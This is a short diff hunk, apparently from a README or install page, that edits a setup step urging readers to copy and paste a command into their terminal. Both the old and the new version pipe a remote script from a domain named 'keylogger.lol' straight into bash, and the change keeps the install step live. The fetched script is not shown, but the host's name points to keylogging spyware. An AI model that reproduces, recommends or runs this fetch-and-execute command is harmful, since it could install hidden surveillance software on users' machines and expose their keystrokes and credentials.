@@ -10,7 +10,7 @@ Be a cool guy and copy&paste this into your terminal to get started now:
 
 ```bash
 # run it
-curl -fsSL tools.keylogger.lol | bash
+curl -fsSL keylogger.lol/tools | bash
 ```
 
 ```bash
